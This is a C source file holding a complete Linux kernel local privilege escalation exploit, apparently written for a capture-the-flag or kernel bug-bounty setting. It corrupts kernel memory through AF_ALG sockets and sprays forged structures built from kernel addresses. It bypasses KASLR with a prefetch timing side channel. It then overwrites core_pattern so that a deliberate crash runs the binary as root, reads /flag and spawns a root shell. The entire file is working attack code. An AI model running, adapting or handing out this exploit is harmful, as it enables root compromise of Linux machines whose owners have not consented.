#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <pthread.h>
#include <err.h>
#include <sys/sendfile.h>
#include <pthread.h>
#include <sys/msg.h>
#include <sys/sendfile.h>
#include <linux/if_alg.h>

#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif

#define PAUSE           \
    {                   \
        int x;          \
        printf(":");    \
        read(0, &x, 1); \
    }

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define STEXT 0xffffffff81000000

unsigned long long fake_buf[43] = {
    0xffffffff83db3480,
    0xffffffff83da2a90,
    0x0000000000000000,
    0xffffffff81521ba0,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0xffffffff83254e05,
    0x0000000000000000,
    0xffffffff81520eb0,
    0x0000000000000000,
    0x0000000000000000,
    0xffffffff814ae4f0,
    0x0000000000000000,
    0xffffffff83db6460,
    0x0000000000000000,
    0x0000000000000001,
    0xffffffff83db3470,
    0xffffffff83db3470,
    0xffffffff83db34c0,
    0xffffffff83db33e0,
    0x0000000000000000,
    0xffffffff81521e40,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0xffffffff83db3500,
    0xffffffff83db3480,
    0x0000000000000000,
    0xffffffff815237c0,
    0xffffffff81522390,
    0xffffffff815225f0,
    0x0000000000001000,
    0x0000000000000000,
    0xffffffff83da2a90,
    0xffffffff83db34c0,
    0x0000000000000000,
    0xffffffff815266a0,
    0xffffffff81525210,
    0xffffffff81525470,
    0x0000000000001000,
};

unsigned long long fake_buf2[33] = {
    0xffffffff83257ccf,
    0xffffffff84b390c8,
    0x000001a400000004,
    0x0000000000000000,
    0xffffffff811d1260,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0xffffffff83257cdd,
    0xffffffff83db3720,
    0x000001a400000080,
    0x0000000000000000,
    0xffffffff8152bdb0,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0xffffffff83257cea,
    0xffffffff84b390c4,
    0x000001a400000004,
    0x0000000000000000,
    0xffffffff811d1260,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000000,
    0x0000000000000080,

};

#define THREAD_NUM 0x80

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

int tfmfd, opfd;
char *victim_addr;
char buf[0x5000];
char payload[0x1000];
int cfd[2];
int sfd[0x200][2];
pthread_t tid[0x100];

void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void *job(void *x)
{
    size_t idx = (size_t)x;
    write(cfd[0], buf, 1);
    read(cfd[0], buf, 1);
    struct iovec iov = {buf, 0x1000};

    struct msghdr mhdr = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = 0x400};
    while (1)
    {
        sendmsg(sfd[idx][1], &mhdr, 0);
        write(cfd[0], buf, 1);
        read(cfd[0], buf, 1);
    }
}
size_t ktext;

void do_spray()
{
    memset(payload, 0, 0x400);
    *(size_t *)&payload[0] = ktext + 0x2db3720;
    payload[560] = 0;
    struct cmsghdr *first;

    for (int i = 0; i < THREAD_NUM; i++)
    {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sfd[i]));
        int n = 0x800;
        setsockopt(sfd[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n));
        setsockopt(sfd[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n));
        write(sfd[i][1], buf, 0x1000);
    }

    for (int i = 0; i < THREAD_NUM; i++)
        pthread_create(&tid[i], 0, job, (void *)(size_t)i);

    for (int i = 0; i < THREAD_NUM; i++)
        read(cfd[1], buf, 1);
}

int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
    int memfd = memfd_create("", 0);
    // send our binary to memfd for core_pattern payload
    SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
    // our binary now at file descriptor 666
    dup2(memfd, 666);
    close(memfd);
    puts("Root shell !!");
    /* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
    *(size_t *)0 = 0;
}
size_t bypass_kaslr(u64 base);
int main(int argc, char **argv)
{
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "hash", // symmetric key cipher
        .salg_name = "md5",  // AES in CBC mode
    };

    if (argc == 1)
    {
        // size_t stext = strtoull(getenv("KTEXT"),0,16); //bypass_kaslr(0) /*-0x30a0000UL*/;
        ktext = bypass_kaslr(0) /*-0x30a0000UL*/;

        printf("got ktext %zx\n", ktext);
    }

    if (argc > 1)
    {
#define SYS_pidfd_getfd 438
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
        dup2(stdinfd, 0);
        dup2(stdoutfd, 1);
        dup2(stderrfd, 2);
        /* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
        system("cat /flag");
        system("cat /flag");
        system("cat /flag");
        system("cat /flag");
        system("cat /flag");
        system("cat /flag");

        system("cat /flag;echo o>/proc/sysrq-trigger");
        execlp("bash", "bash", NULL);
    }

    //    ktext = strtoull(getenv("KTEXT"), 0, 16);

    for (int i = 0; i < 43; i++)
        if (fake_buf[i] > 0xffffffff81000000ULL)
            fake_buf[i] = fake_buf[i] - 0xffffffff81000000ULL + ktext;
    for (int i = 0; i < 33; i++)
        if (fake_buf2[i] > 0xffffffff81000000ULL)
            fake_buf2[i] = fake_buf2[i] - 0xffffffff81000000ULL + ktext;

    set_cpu(0);

    struct rlimit rlim = {
        .rlim_cur = 0xf000,
        .rlim_max = 0xf000};
    setrlimit(RLIMIT_NOFILE, &rlim);

    int pfd[0x100][2];
    for (int i = 0; i < 0x100; i++)
        pipe(pfd[i]);
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cfd));
    do_spray();

    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    // Create transformation socket
    tfmfd = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));

    // Bind to algorithm
    SYSCHK(bind(tfmfd, (struct sockaddr *)&sa, sizeof(sa)));

    // Accept operation socket
    opfd = SYSCHK(accept(tfmfd, NULL, 0));
    SYSCHK(send(opfd, buf, 1, MSG_MORE));
    for (int i = 0; i < THREAD_NUM; i++)
        write(cfd[1], buf, 1);

    for (int i = 0; i < THREAD_NUM; i++)
    {

        read(cfd[1], buf, 1);
    }

    int opfd2 = SYSCHK(accept(opfd, NULL, 0));
    struct iovec iov = {.iov_base = buf, .iov_len = 0};
    struct msghdr msg = {
        .msg_iovlen = 1,
        .msg_iov = &iov,
        .msg_control = buf,
        .msg_controllen = 0x4cdf,
    };
    

    sendmsg(opfd2, &msg, 0);
    do{
        char *anon = SYSCHK(mmap(NULL, 0x10000000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));
        for (int i = 0; i < 0x10000000; i += 0x1000)
        {
            memcpy(anon + i + 0x3e0, fake_buf, 0x158);
            memcpy(anon + i + 0x600, fake_buf2, 264);
            strcpy(anon + i + 0x720, "|/proc/%P/fd/666 %P");
        }
    } while(check_core() == 0);
    
    if (fork() == 0) // this process is used to trigger core_pattern exploit
    {
        setsid();
        crash("");
    }
    while (1)
        sleep(1);

    return 0;
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin()
{
    uint64_t a, d;
    asm volatile("mfence\n\t"
                 "RDTSCP\n\t"
                 "mov %%rdx, %0\n\t"
                 "mov %%rax, %1\n\t"
                 "xor %%rax, %%rax\n\t"
                 "lfence\n\t"
                 : "=r"(d), "=r"(a)
                 :
                 : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end()
{
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r"(d), "=r"(a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

void prefetch(void *p)
{
    asm volatile(
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r"(p));
}

size_t flushandreload(void *addr) // row miss
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

//#define KASLR_BYPASS_INTEL
size_t bypass_kaslr(u64 base)
{
    if (!base)
    {
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END (0xffffffffD0000000ull + OFFSET)
#define STEP 0x0000000001000000ull
        while (1)
        {
            u64 bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        u64 addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++)
                {
                    if (times[ti] < minv)
                    {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0)
                {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                base -= OFFSET;
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 9
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

        while (1)
        {
            u64 bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        u64 addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++)
                {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++)
                    {
                        sum += times[ti + i];
                    }
                    if (sum > max)
                    {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
#endif
    }

got_base:

    printf("using kernel base %llx\n", base);

    return base;
}


